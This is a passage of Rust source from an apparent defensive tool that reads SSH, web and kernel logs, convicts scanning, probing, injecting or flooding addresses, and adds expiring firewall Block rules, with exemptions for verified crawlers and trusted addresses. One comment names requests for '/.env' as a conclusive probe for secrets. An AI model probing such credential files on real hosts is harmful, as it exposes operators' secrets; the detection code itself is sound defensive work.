/*  This file is part of the stop-bots project.
 *
 *  Copyright (C) 2026 Marko Ivankovic
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU Affero General Public License as published
 *  by the Free Software Foundation, version 3 of the License.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU Affero General Public License for more details.
 *
 *  You should have received a copy of the GNU Affero General License
 *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

//! Shared "detect scanning IPs, add temporary Block rules" logic behind the
//! CLI's `run-detector ssh-scanners`/`run-detector web-scanners` subcommands and the internal
//! cron's `BlockScanners`/`BlockWebScanners` jobs (see [`crate::cron`]) —
//! pulled out so neither caller can drift from the other, and so neither
//! ever needs to `println!` from inside detection logic that the TUI (which
//! owns the whole terminal via an alternate screen) might also be driving.
//! Callers get a plain [`ScanBlockOutcome`] back and decide for themselves
//! how to present it: the CLI reconstructs its existing wording, the cron
//! job turns it into a one-line summary for the Dashboard.

use crate::db::{Db, FirewallAction, NewFirewallRule, RuleSource};
use crate::evidence::{decide, Rule};
use crate::protection::Detector;
use crate::{accesslog, ipranges, sshlog};
use anyhow::Result;
use std::collections::{HashMap, HashSet};

/// Which detector produced a [`ScanBlockOutcome`]. Only affects the noun
/// in [`ScanBlockOutcome::summary`] — "no scanning IPs found" would be
/// actively misleading on the Dashboard for a pass that was looking for
/// forged crawler user agents, not scanning behaviour.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum ScanKind {
    #[default]
    Scanning,
    SpoofedCrawler,
    ProbePath,
    Injection,
    ProtocolProbe,
    Honeypot,
    /// The three behavioural detectors share a noun: each finds a client
    /// that doesn't act like a browser, by a different tell.
    NonBrowser,
    RobotsTxt,
    LoginAttempt,
    RequestRate,
    RobotsViolator,
    PortScan,
}

impl ScanKind {
    /// Which kind of finding `detector` makes.
    pub fn of(detector: Detector) -> ScanKind {
        match detector {
            Detector::SshScanners | Detector::WebScanners => ScanKind::Scanning,
            Detector::SpoofedCrawlers => ScanKind::SpoofedCrawler,
            Detector::ProbePaths => ScanKind::ProbePath,
            Detector::Injection => ScanKind::Injection,
            Detector::ProtocolProbes => ScanKind::ProtocolProbe,
            Detector::Honeypot => ScanKind::Honeypot,
            Detector::AssetRatio | Detector::RotatingUserAgent | Detector::RefererlessCrawl => {
                ScanKind::NonBrowser
            }
            Detector::RobotsTxt => ScanKind::RobotsTxt,
            Detector::LoginAttempts => ScanKind::LoginAttempt,
            Detector::RequestRate => ScanKind::RequestRate,
            Detector::RobotsViolators => ScanKind::RobotsViolator,
            Detector::PortScanners => ScanKind::PortScan,
        }
    }

    /// The noun this detector's findings are called, singular — the CLI's
    /// `print_scan_block_outcome` needs it too, so it isn't private.
    pub fn noun(self) -> &'static str {
        match self {
            ScanKind::Scanning => "scanning IP",
            ScanKind::SpoofedCrawler => "forged crawler IP",
            ScanKind::ProbePath => "probing IP",
            ScanKind::Injection => "injecting IP",
            ScanKind::ProtocolProbe => "protocol-probing IP",
            ScanKind::Honeypot => "trapped IP",
            ScanKind::NonBrowser => "non-browser IP",
            ScanKind::RobotsTxt => "robots.txt fetcher",
            ScanKind::LoginAttempt => "password-guessing IP",
            ScanKind::RequestRate => "flooding IP",
            ScanKind::RobotsViolator => "robots.txt violator",
            ScanKind::PortScan => "port-scanning IP",
        }
    }
}

/// What one detection-and-block pass found and did.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScanBlockOutcome {
    /// What was being looked for — see [`ScanKind`].
    pub kind: ScanKind,
    /// How many IPs the raw threshold-based detector flagged, before any
    /// known-crawler exclusion.
    pub candidates: usize,
    /// Of `candidates`, how many were skipped because they matched a known
    /// crawler's published IP range, or a CDN's edge (see [`crate::cdn`]).
    pub skipped_known_crawlers: usize,
    /// Whether the known-crawler exclusion had any ranges to check
    /// against — `false` means `update-crawler-ranges` has never been run for
    /// any of the three crawler sources, so the exclusion is a no-op.
    /// Always `true` (meaningless) for [`block_ssh_scanners`].
    pub crawler_exclusion_active: bool,
    /// Of the candidates that survived crawler exclusion, how many were
    /// already covered by an existing firewall rule of the same exact
    /// address (any action) and so weren't re-added.
    pub already_covered: usize,
    /// Of the candidates, how many were left alone because a successful
    /// SSH login has been seen from them inside the anti-lockout window
    /// (see [`crate::db::SSH_LOGIN_WINDOW_SECONDS`]).
    ///
    /// `firewall::all_rules` would have neutralised such a rule anyway, by
    /// putting an Allow ahead of it — this is about not *writing* it.
    /// A row saying Block against the operator's own address is alarming
    /// whether or not it has any effect, and the Firewall screen
    /// reads `firewall_rules` directly, so it would show that address as
    /// blocked when it is not.
    pub skipped_ssh_logins: usize,
    /// Of the candidates, how many were left alone because they overlap an
    /// address an operator trusted by hand (see [`Db::trust_address`]).
    /// Not written for the reason [`Self::skipped_ssh_logins`] gives —
    /// the Allow ahead of it would win anyway, and a Block row against a
    /// trusted address would show it as blocked when it is not.
    pub skipped_trusted: usize,
    /// Of the candidates, how many were left alone because an operator
    /// removed a detector's block on them recently (see [`crate::blocks`]):
    /// re-adding it would undo the operator's decision on the next pass.
    pub skipped_unblocked: usize,
    /// Addresses actually newly blocked — or, if `dry_run`, that would
    /// have been.
    pub newly_blocked: Vec<String>,
    /// Of `newly_blocked`, the ones blocked before, and blocked for longer
    /// this time (see `protection::escalated_ttl_days`). Empty when
    /// escalation is off.
    pub repeat_offenders: Vec<RepeatOffender>,
    /// The detector's own TTL: what every block in `newly_blocked` lasts
    /// that is not in `repeat_offenders`.
    pub ttl_days: i64,
    pub dry_run: bool,
}

/// An address blocked again, and how long for this time.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RepeatOffender {
    pub address: String,
    /// Which offence this is: 2 for the second block.
    pub offence: u32,
    pub ttl_days: i64,
}

impl ScanBlockOutcome {
    /// A one-line summary suitable for a status display (the Dashboard's
    /// "Scheduled tasks" panel, `Db::set_cron_last_run`'s `summary`
    /// argument) — deliberately terser than the CLI's multi-line output,
    /// which reconstructs its own wording directly from this struct's
    /// fields instead of using this method.
    pub fn summary(&self) -> String {
        let noun = self.kind.noun();
        if self.candidates == 0 {
            return format!("no {noun}s found");
        }
        if self.newly_blocked.is_empty() {
            let surviving = self.candidates - self.skipped_known_crawlers;
            if self.already_covered == 0 {
                let reasons: Vec<&str> = [
                    (self.skipped_trusted > 0, "trusted"),
                    (self.skipped_ssh_logins > 0, "recent SSH logins"),
                    (self.skipped_unblocked > 0, "unblocked by hand"),
                ]
                .into_iter()
                .filter_map(|(applies, reason)| applies.then_some(reason))
                .collect();
                if !reasons.is_empty() {
                    return format!(
                        "found {surviving} {noun}(s), all {} — left alone",
                        reasons.join(" or ")
                    );
                }
            }
            return format!("found {surviving} {noun}(s), all already covered");
        }
        let verb = if self.dry_run {
            "would block"
        } else {
            "blocked"
        };
        let longer = match self.repeat_offenders.len() {
            0 => String::new(),
            n => format!(", {n} for longer as repeat offender(s)"),
        };
        format!("{verb} {} IP(s){longer}", self.newly_blocked.len())
    }
}

/// What `detector` needs to see before it blocks.
///
/// The threshold is the stored one (see `Detector::threshold`), the same
/// for every scheduler; the CLI's one-off `run-detector` takes its from a
/// flag instead. The SSH scanner counts failed-login lines and the login
/// brute-force detector login attempts; the others that have a threshold
/// count distinct things, and the web scanner one page asked for over and
/// over as well; the rest need one line.
pub fn rule(db: &Db, detector: crate::protection::Detector) -> Result<Rule> {
    use crate::protection::Detector as D;
    Ok(match (detector, detector.threshold(db)?) {
        (D::SshScanners | D::LoginAttempts, Some(n)) => Rule::AtLeast(n),
        (D::RequestRate, Some(n)) => {
            crate::protection::request_rate_rule(n, detector.window_seconds(db)?)
        }
        (D::WebScanners, Some(n)) => Rule::DistinctOrRepeated {
            distinct: n,
            repeated: crate::protection::WEB_SCANNERS_REPEATS,
        },
        (_, Some(n)) => Rule::Distinct(n),
        (D::RobotsViolators, None) => Rule::AfterWarning,
        (D::ProtocolProbes, None) => Rule::OnceUnlessCleared,
        (_, None) => Rule::Once,
    })
}

/// Runs `detector` on the evidence stored for it inside its window, as of
/// `now`, and blocks what that convicts.
///
/// The one place that maps a [`Detector`](crate::protection::Detector) onto
/// what it blocks for. Every scheduler goes through here -- the internal
/// cron, run by the TUI and by `tick`, and `crate::batch` -- so a detector
/// added to `Detector::ALL` and forgotten here fails to compile rather
/// than silently never running from one of them.
///
/// The evidence is what `crate::logscan` read and stored: every line in the
/// window, however many passes it took to read them, and nothing older.
/// See `crate::evidence` for why it is kept rather than re-read.
pub fn run_detector(
    db: &Db,
    detector: crate::protection::Detector,
    ttl_days: i64,
    now: i64,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    use crate::protection::Detector as D;
    let since = now - detector.window_seconds(db)?;
    let rule = rule(db, detector)?;
    let rows = db.evidence_rows(detector, since, rule)?;
    let mut convicted = decide(&rows, rule, Some(since));
    // And, where the operator switched subnet escalation on, the /24s
    // whose addresses add up to a scan that none of them is alone (see
    // `evidence::decide_subnets`). The three whose evidence is an attack
    // on something, not a way of browsing: a busy carrier's /24 fetches
    // few assets and sends many user agents without anyone in it scanning.
    if matches!(detector, D::SshScanners | D::WebScanners | D::LoginAttempts) {
        if let Some(min) = crate::protection::subnet_escalation(db)? {
            let every = db.all_evidence_rows(detector, since)?;
            let subnets = crate::evidence::decide_subnets(&every, rule, Some(since), min);
            // An address its /24 answers for is not also blocked alone.
            convicted.retain(|(address, _)| {
                !subnets.iter().any(|(subnet, _)| {
                    address
                        .parse()
                        .is_ok_and(|ip| ipranges::cidr_contains(subnet, ip))
                })
            });
            convicted.extend(subnets);
        }
    }
    let found = convicted.len();
    // Each convicted address with the item that convicted it: the path,
    // the payload's name, the crawler it claimed to be. That is what its
    // block records as evidence; see `crate::blocks`.
    let hinted = |convicted: Vec<(String, String)>| -> Vec<(String, Option<String>)> {
        convicted
            .into_iter()
            .map(|(ip, item)| (ip, (!item.is_empty()).then_some(item)))
            .collect()
    };
    let trigger = Trigger {
        log_text: None,
        dry_run,
    };
    match detector {
        D::SshScanners | D::RobotsTxt => add_block_rules(
            db,
            detector,
            found,
            hinted(convicted),
            0,
            true,
            ttl_days,
            trigger,
        ),
        D::SpoofedCrawlers => {
            // Checked again against the ranges as they are now: the
            // evidence was judged against the ranges at the time it was
            // read, and a crawler that published a new range since then
            // has just vouched for an address this would otherwise block.
            let claims = crawler_claims(db)?;
            let still_forged = |ip: &str, name: &str| {
                let Ok(addr) = ip.parse::<std::net::IpAddr>() else {
                    return false;
                };
                claims
                    .iter()
                    .find(|claim| claim.name == name)
                    .is_some_and(|claim| {
                        !claim
                            .ranges
                            .iter()
                            .any(|cidr| ipranges::cidr_contains(cidr, addr))
                    })
            };
            let candidates = convicted
                .into_iter()
                .filter(|(ip, name)| still_forged(ip, name))
                .collect();
            add_block_rules(
                db,
                detector,
                found,
                hinted(candidates),
                0,
                !claims.is_empty(),
                ttl_days,
                trigger,
            )
        }
        // The four that act on one request are here for a reason of
        // their own. Anyone can publish a link to `/.env`, or to a page
        // with a payload in its query, and a crawler follows links: the
        // request then comes from the search engine's address, and a
        // block of that address is the site out of the index for the
        // length of the TTL, at the wish of whoever wrote the link.
        D::ProbePaths
        | D::Injection
        | D::ProtocolProbes
        | D::Honeypot
        | D::WebScanners
        | D::AssetRatio
        | D::RotatingUserAgent
        | D::RefererlessCrawl
        | D::LoginAttempts
        | D::RequestRate
        | D::RobotsViolators => {
            excluding_known_crawlers(db, detector, hinted(convicted), ttl_days, trigger)
        }
        D::PortScanners => {
            // Every trap port each address tried inside the window, not
            // only the first: the list is the evidence.
            let candidates = convicted
                .into_iter()
                .map(|(ip, _)| {
                    let ports = ports_tried(&rows, &ip, since);
                    (ip, Some(crate::portscan::join(&ports)))
                })
                .collect();
            // A SYN proves nothing about who sent it (see
            // `Detector::risk`), so the addresses a forged one would hurt
            // most are never blocked on its word.
            excluding_known_crawlers(db, detector, candidates, ttl_days, trigger)
        }
    }
}

/// The trap ports `address` tried at or after `since`, from the port-scan
/// detector's evidence rows, sorted.
fn ports_tried(rows: &[crate::evidence::Row], address: &str, since: i64) -> Vec<u16> {
    let mut ports: Vec<u16> = rows
        .iter()
        .filter(|row| row.address == address && row.tally.last >= since)
        .filter_map(|row| match &row.item {
            crate::evidence::Item::Seen(port) => port.parse().ok(),
            _ => None,
        })
        .collect();
    ports.sort_unstable();
    ports.dedup();
    ports
}

/// Finds addresses in `log_text` (a kernel log) that tried at least
/// `threshold` different trap ports (see [`crate::portscan::scanning_ips`])
/// and blocks each, recording the ports it tried. For the one-off
/// `run-detector port-scanners`; the schedule decides on stored evidence
/// instead.
pub fn block_port_scanners(
    db: &Db,
    threshold: usize,
    ttl_days: i64,
    log_text: &str,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    let candidates: Vec<(String, Option<String>)> =
        crate::portscan::scanning_ips(log_text, threshold)
            .into_iter()
            .map(|(ip, ports)| (ip, Some(crate::portscan::join(&ports))))
            .collect();
    excluding_known_crawlers(
        db,
        Detector::PortScanners,
        candidates,
        ttl_days,
        Trigger::log(log_text, dry_run),
    )
}

/// Finds scanning IPs in `log_text` (an SSH log's contents — see
/// [`crate::sshlog::scanning_ips`] for exactly what counts) and adds a
/// Block rule, expiring after `ttl_days`, for each one not already covered
/// by an existing firewall rule of the same exact address. `dry_run`
/// leaves the database untouched but still reports what would have
/// happened via the returned [`ScanBlockOutcome`].
pub fn block_ssh_scanners(
    db: &Db,
    threshold: usize,
    ttl_days: i64,
    log_text: &str,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    let candidates = sshlog::scanning_ips(log_text, threshold);
    let found = candidates.len();
    add_block_rules(
        db,
        Detector::SshScanners,
        found,
        unhinted(candidates),
        0,
        true,
        ttl_days,
        Trigger::log(log_text, dry_run),
    )
}

/// Finds scanning IPs in `log_text` (an NGINX access log's contents — see
/// [`crate::accesslog::scanning_ips`]), excludes any that fall inside a
/// known crawler's published IP ranges (see [`known_crawler_ranges`] —
/// unlike [`block_ssh_scanners`], there's no "had a success" exclusion
/// here; see `accesslog`'s module docs for why), and adds a Block rule,
/// expiring after `ttl_days`, for each IP that's left and isn't already
/// covered by an existing firewall rule of the same exact address.
pub fn block_web_scanners(
    db: &Db,
    threshold: usize,
    ttl_days: i64,
    log_text: &str,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    let hosted = crate::logscan::hosted(db)?;
    let candidates = accesslog::scanning_ips_hosted(log_text, threshold, hosted);
    excluding_known_crawlers(
        db,
        Detector::WebScanners,
        unhinted(candidates),
        ttl_days,
        Trigger::log(log_text, dry_run),
    )
}

/// Every CIDR published by a known crawler source (Googlebot, Bingbot,
/// GPTBot — the same three [`ipranges::IpRangeSourceKind::ALL`] sources
/// `update-crawler-ranges` fetches), regardless of `db`'s current category
/// defaults: this exclusion is about never misidentifying a *verified*
/// crawler as a scanner via behavioral heuristics, independent of whether
/// the admin has separately chosen to block that crawler's category
/// through the normal (range-complete, not heuristic) derived-firewall-rule
/// path. Empty if none of the three sources has ever been fetched.
pub fn known_crawler_ranges(db: &Db) -> Result<Vec<String>> {
    let mut ranges = Vec::new();
    for kind in ipranges::IpRangeSourceKind::ALL {
        ranges.extend(db.ip_ranges_for_source(kind.id())?);
    }
    Ok(ranges)
}

/// Builds the [`accesslog::CrawlerClaim`] list for
/// [`block_spoofed_crawlers`] from whatever crawler ranges `db` currently
/// holds. **Sources with no stored ranges are dropped**, not included
/// empty: an empty range list would make every real request from that
/// crawler look like an impersonation, so a fresh install (or one whose
/// `update-crawler-ranges` has never succeeded) would block the actual
/// Googlebot. Dropping them makes the detector inert instead, which is the
/// only safe failure mode here.
///
/// The markers are the tokens an impersonator actually copies. They're
/// matched as lowercase substrings of the user agent, so `Googlebot/2.1`,
/// `compatible; Googlebot/2.1; +http://...` and a bare `googlebot` all
/// count — which is the point, since the whole population being detected
/// is "things that put this word in their UA".
pub fn crawler_claims(db: &Db) -> Result<Vec<accesslog::CrawlerClaim>> {
    let mut claims = Vec::new();
    for kind in ipranges::IpRangeSourceKind::ALL {
        let ranges = db.ip_ranges_for_source(kind.id())?;
        if ranges.is_empty() {
            continue;
        }
        let marker = match kind {
            ipranges::IpRangeSourceKind::GoogleBot => "googlebot",
            ipranges::IpRangeSourceKind::BingBot => "bingbot",
            ipranges::IpRangeSourceKind::GptBot => "gptbot",
        };
        claims.push(accesslog::CrawlerClaim {
            marker,
            name: kind.name(),
            ranges,
        });
    }
    Ok(claims)
}

/// Finds IPs in `log_text` (an NGINX access log) claiming to be a crawler
/// whose operator doesn't publish their address (see
/// [`accesslog::spoofed_crawler_ips`]) and adds a Block rule, expiring
/// after `ttl_days`, for each one not already covered by an existing rule
/// of the same exact address.
///
/// No threshold argument, unlike [`block_ssh_scanners`]/
/// [`block_web_scanners`]: one forged request is already conclusive, so
/// there's no count to tune. No known-crawler exclusion either — verifying
/// against exactly those ranges *is* the detection, so an IP that survives
/// it has already been checked against every range this project knows.
pub fn block_spoofed_crawlers(
    db: &Db,
    ttl_days: i64,
    log_text: &str,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    let claims = crawler_claims(db)?;
    let spoofed = accesslog::spoofed_crawler_ips(log_text, &claims);
    let found = spoofed.len();
    let candidates = spoofed
        .into_iter()
        .map(|(ip, name)| (ip, Some(name)))
        .collect();
    add_block_rules(
        db,
        Detector::SpoofedCrawlers,
        found,
        candidates,
        0,
        !claims.is_empty(),
        ttl_days,
        Trigger::log(log_text, dry_run),
    )
}

/// Finds IPs in `log_text` (an NGINX access log) that requested one of the
/// configured probe paths (see [`crate::protection::probe_paths`] and
/// [`accesslog::probe_path_ips`]) and adds a Block rule, expiring after
/// `ttl_days`, for each one not already covered.
///
/// Like [`block_spoofed_crawlers`] and unlike the two behavioural
/// detectors, there's no threshold: the path list is chosen so that a
/// single request to any entry is conclusive on its own.
///
/// No known-crawler exclusion, deliberately. A search crawler has no
/// business requesting `/.env` either — if one ever did, that request is
/// exactly as unwelcome as anyone else's, and unlike the 404-counting
/// detector there's no risk of mistaking ordinary link-chasing for it.
/// Blocks every public address that fetched `/robots.txt`.
///
/// Reached only under "humans only" — `Detector::is_enabled` answers for
/// this one from that switch — because outside it this rule blocks the
/// crawlers that were trying to find out what they were allowed to do.
/// See [`crate::accesslog::robots_txt_ips`].
pub fn block_robots_txt(
    db: &Db,
    ttl_days: i64,
    log_text: &str,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    let candidates = accesslog::robots_txt_ips(log_text);
    let found = candidates.len();
    add_block_rules(
        db,
        Detector::RobotsTxt,
        found,
        unhinted(candidates),
        0,
        true,
        ttl_days,
        Trigger::log(log_text, dry_run),
    )
}

pub fn block_probe_paths(
    db: &Db,
    ttl_days: i64,
    log_text: &str,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    let paths = crate::protection::probe_paths(db)?;
    let apps = crate::logscan::app_probes_if_on(db)?;
    let hits = accesslog::app_probe_path_ips(log_text, &paths, &apps);
    let candidates = hits
        .into_iter()
        .map(|(ip, path)| (ip, Some(path)))
        .collect();
    excluding_known_crawlers(
        db,
        Detector::ProbePaths,
        candidates,
        ttl_days,
        Trigger::log(log_text, dry_run),
    )
}

/// Finds addresses in `log_text` that sent an exploit payload (see
/// [`accesslog::injection_ips`]) and adds a Block rule expiring after
/// `ttl_days` for each — through the same exemptions as every detector
/// here, so an address that logged in over SSH, a trusted one, or one
/// inside a verified crawler's range is never blocked by it.
pub fn block_injection(
    db: &Db,
    ttl_days: i64,
    log_text: &str,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    let hits = accesslog::injection_ips(log_text);
    let candidates = hits
        .into_iter()
        .map(|(ip, kind)| (ip, Some(kind)))
        .collect();
    excluding_known_crawlers(
        db,
        Detector::Injection,
        candidates,
        ttl_days,
        Trigger::log(log_text, dry_run),
    )
}

/// Finds addresses in `log_text` that sent a request not for a web page
/// (see [`accesslog::protocol_probe_ips`]) and adds a Block rule expiring
/// after `ttl_days` for each, through the same exemptions as every
/// detector here.
pub fn block_protocol_probes(
    db: &Db,
    ttl_days: i64,
    log_text: &str,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    let hits = accesslog::protocol_probe_ips(log_text, crate::logscan::hosted(db)?);
    let candidates = hits
        .into_iter()
        .map(|(ip, kind)| (ip, Some(kind)))
        .collect();
    excluding_known_crawlers(
        db,
        Detector::ProtocolProbes,
        candidates,
        ttl_days,
        Trigger::log(log_text, dry_run),
    )
}

/// Finds IPs in `log_text` that fetched the configured honeypot path (see
/// [`crate::protection::honeypot_path`]) and adds a Block rule expiring
/// after `ttl_days`.
///
/// Mechanically the same single-request match as [`block_probe_paths`],
/// and deliberately reusing [`accesslog::probe_path_ips`] rather than
/// growing a second matcher. What makes it a *honeypot* rather than one
/// more probe path is external to the matching: the path is published as
/// `Disallow:` in the robots.txt this project generates, so fetching it
/// proves the client read robots.txt and ignored it — or guessed a path
/// that exists for no other purpose. Kept as its own detector, with its
/// own toggle and cron job, because that signal is much stronger than a
/// generic probe and earns a much longer TTL.
pub fn block_honeypot(
    db: &Db,
    ttl_days: i64,
    log_text: &str,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    let path = crate::protection::honeypot_path(db)?;
    let hits = accesslog::honeypot_ips(log_text, &path);
    let candidates = hits
        .into_iter()
        .map(|(ip, path)| (ip, Some(path)))
        .collect();
    excluding_known_crawlers(
        db,
        Detector::Honeypot,
        candidates,
        ttl_days,
        Trigger::log(log_text, dry_run),
    )
}

/// Blocks clients that fetched pages but never an asset — see
/// [`accesslog::asset_less_ips`] for the three guards that make this
/// usable and the one false positive it can't rule out.
pub fn block_asset_ratio(
    db: &Db,
    ttl_days: i64,
    log_text: &str,
    threshold: Option<usize>,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    let min_pages = match threshold {
        Some(n) => n,
        None => crate::protection::threshold(
            db,
            crate::protection::ASSET_RATIO_MIN_PAGES,
            crate::protection::ASSET_RATIO_MIN_PAGES_DEFAULT,
        )?,
    };
    let candidates = accesslog::asset_less_ips(log_text, min_pages);
    excluding_known_crawlers(
        db,
        Detector::AssetRatio,
        unhinted(candidates),
        ttl_days,
        Trigger::log(log_text, dry_run),
    )
}

/// Blocks clients presenting many distinct user agents — see
/// [`accesslog::rotating_user_agent_ips`], and note the NAT caveat there.
pub fn block_rotating_ua(
    db: &Db,
    ttl_days: i64,
    log_text: &str,
    threshold: Option<usize>,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    let min_agents = match threshold {
        Some(n) => n,
        None => crate::protection::threshold(
            db,
            crate::protection::ROTATING_UA_MIN,
            crate::protection::ROTATING_UA_MIN_DEFAULT,
        )?,
    };
    let candidates = accesslog::rotating_user_agent_ips(log_text, min_agents);
    excluding_known_crawlers(
        db,
        Detector::RotatingUserAgent,
        unhinted(candidates),
        ttl_days,
        Trigger::log(log_text, dry_run),
    )
}

/// Blocks clients that walked many deep pages without ever sending a
/// `Referer` — see [`accesslog::refererless_crawl_ips`].
pub fn block_refererless(
    db: &Db,
    ttl_days: i64,
    log_text: &str,
    threshold: Option<usize>,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    let min_paths = match threshold {
        Some(n) => n,
        None => crate::protection::threshold(
            db,
            crate::protection::REFERERLESS_MIN_PATHS,
            crate::protection::REFERERLESS_MIN_PATHS_DEFAULT,
        )?,
    };
    let candidates = accesslog::refererless_crawl_ips(log_text, min_paths);
    excluding_known_crawlers(
        db,
        Detector::RefererlessCrawl,
        unhinted(candidates),
        ttl_days,
        Trigger::log(log_text, dry_run),
    )
}

/// Blocks addresses that posted to a login page at least `threshold` times
/// (the stored one when `None`) in `log_text`: see
/// [`accesslog::login_attempt_ips`]. A verified crawler is never blocked
/// by it, though none has any business posting a password.
pub fn block_login_attempts(
    db: &Db,
    ttl_days: i64,
    log_text: &str,
    threshold: Option<usize>,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    let threshold = match threshold {
        Some(n) => n,
        None => crate::protection::threshold(
            db,
            crate::protection::LOGIN_ATTEMPTS_MIN,
            crate::protection::LOGIN_ATTEMPTS_MIN_DEFAULT,
        )?,
    };
    let hosted = crate::logscan::hosted(db)?;
    let candidates = accesslog::login_attempt_ips(log_text, threshold, hosted)
        .into_iter()
        .map(|(ip, path)| (ip, Some(path)))
        .collect();
    excluding_known_crawlers(
        db,
        Detector::LoginAttempts,
        candidates,
        ttl_days,
        Trigger::log(log_text, dry_run),
    )
}

/// Blocks addresses that kept up `threshold` requests a minute (the stored
/// one when `None`) over the detector's window, or were refused too often
/// by a rate limit, in `log_text`: see [`accesslog::request_rate_ips`].
pub fn block_request_rate(
    db: &Db,
    ttl_days: i64,
    log_text: &str,
    threshold: Option<usize>,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    let detector = Detector::RequestRate;
    let per_minute = match threshold {
        Some(n) => n,
        None => detector.threshold(db)?.unwrap_or_default(),
    };
    let hosted = crate::logscan::hosted(db)?;
    let window = detector.window_seconds(db)?;
    let candidates = accesslog::request_rate_ips(log_text, per_minute, window, hosted)
        .into_iter()
        .map(|(ip, count)| (ip, Some(count)))
        .collect();
    excluding_known_crawlers(
        db,
        detector,
        candidates,
        ttl_days,
        Trigger::log(log_text, dry_run),
    )
}

/// Blocks clients that fetched robots.txt and then a page it forbids them,
/// in `log_text`: see [`accesslog::robots_violator_ips`]. Judged by the
/// generated robots.txt (see [`crate::protection::robots_rules`]), so it
/// finds nothing while that is not served.
///
/// A verified crawler is never blocked by it. The real Googlebot obeys
/// robots.txt, so one caught here more likely means this reading of a
/// rule differs from Google's than that Google ignored it, and a week
/// without search traffic is too high a price for that. A forged one is
/// the forged-crawler detector's to block.
pub fn block_robots_violators(
    db: &Db,
    ttl_days: i64,
    log_text: &str,
    dry_run: bool,
) -> Result<ScanBlockOutcome> {
    let candidates = match crate::protection::robots_rules(db)? {
        Some(robots) => accesslog::robots_violator_ips(log_text, &robots)
            .into_iter()
            .map(|(ip, path)| (ip, Some(path)))
            .collect(),
        None => Vec::new(),
    };
    excluding_known_crawlers(
        db,
        Detector::RobotsViolators,
        candidates,
        ttl_days,
        Trigger::log(log_text, dry_run),
    )
}

/// Blocks `candidates`, less any inside a known crawler's published ranges
/// (see [`known_crawler_ranges`]).
///
/// Every detector goes through here but three: the SSH scanners, whose
/// evidence is a completed connection to a port no crawler uses; the
/// forged crawlers, which are this check; and the robots.txt fetchers of
/// humans-only mode, which is the operator saying crawlers are not wanted.
/// The behavioural three need it most: all of them describe "doesn't behave
/// like a browser", which is exactly true of Googlebot — it fetches no CSS,
/// uses more than one user agent and never sends a referer — so without it
/// they would block search engines by design.
fn excluding_known_crawlers(
    db: &Db,
    detector: Detector,
    candidates: Vec<(String, Option<String>)>,
    ttl_days: i64,
    trigger: Trigger<'_>,
) -> Result<ScanBlockOutcome> {
    let found = candidates.len();
    let crawler_ranges = known_crawler_ranges(db)?;
    let crawler_exclusion_active = !crawler_ranges.is_empty();
    let mut kept = Vec::new();
    let mut skipped_known_crawlers = 0;
    for candidate in candidates {
        // A range, which is what a subnet convicted as a whole arrives
        // as, is a crawler's if any part of it is.
        let crawler = if candidate.0.contains('/') {
            crawler_ranges
                .iter()
                .any(|range| ipranges::cidrs_overlap(range, &candidate.0))
        } else {
            known_crawler_match(&crawler_ranges, &candidate.0)
        };
        if crawler {
            skipped_known_crawlers += 1;
        } else {
            kept.push(candidate);
        }
    }
    add_block_rules(
        db,
        detector,
        found,
        kept,
        skipped_known_crawlers,
        crawler_exclusion_active,
        ttl_days,
        trigger,
    )
}

/// Whether `ip` falls inside any of `ranges`.
pub fn known_crawler_match(ranges: &[String], ip: &str) -> bool {
    let Ok(addr) = ip.parse::<std::net::IpAddr>() else {
        return false;
    };
    ranges
        .iter()
        .any(|cidr| ipranges::cidr_contains(cidr, addr))
}

/// The address a detector should actually block, given the address it
/// observed.
///
/// **IPv4 is returned unchanged. IPv6 is widened to its `/64`.**
///
/// This is a correctness fix rather than a policy choice. The smallest
/// IPv6 allocation anyone receives is a `/64` — that is the standard
/// subnet for one LAN, one household, one mobile subscriber — so blocking
/// the single `/128` we happened to see is the equivalent of blocking one
/// TCP source port. An attacker holding a `/64` has 2^64 addresses to
/// rotate through and would cost one firewall rule per request while never
/// actually being blocked.
///
/// A `/64` is therefore the IPv6 counterpart of a single IPv4 address, not
/// an escalation: both block roughly "one customer". Widening further (to
/// the `/56` or `/48` a site may hold) *would* be an escalation, and is
/// deliberately not done here.
///
/// An unparseable address is passed through untouched — this runs on
/// strings that already came from a parsed log, and a detector should not
/// silently drop a candidate because this helper didn't recognise it.
pub fn blockable_address(observed: &str) -> String {
    let v6 = match observed
        .parse::<std::net::IpAddr>()
        .map(|ip| ip.to_canonical())
    {
        Ok(std::net::IpAddr::V6(v6)) => v6,
        // `::ffff:203.0.113.5` is 203.0.113.5. Widened as the IPv6 address
        // it is written as, it became `::/64`, a rule that matches no
        // IPv4 packet and made every later one "already covered".
        Ok(v4) => return v4.to_string(),
        Err(_) => return observed.to_string(),
    };
    let mut octets = v6.octets();
    // Zero the host half (the low 64 bits); the network half is the /64.
    octets[8..].fill(0);
    format!("{}/64", std::net::Ipv6Addr::from(octets))
}

/// Collapses IPv4 addresses into their `/24` where at least `min` of them
/// were flagged in the same pass, leaving everything else untouched.
///
/// Only ever called when the admin switched escalation on — see
/// [`crate::protection::subnet_escalation`] for why this is a policy knob
/// and IPv6 `/64` widening isn't. Scoped to one pass on purpose: "three
/// neighbours misbehaving right now" is evidence about the subnet,
/// whereas three over six months is just a busy ISP.
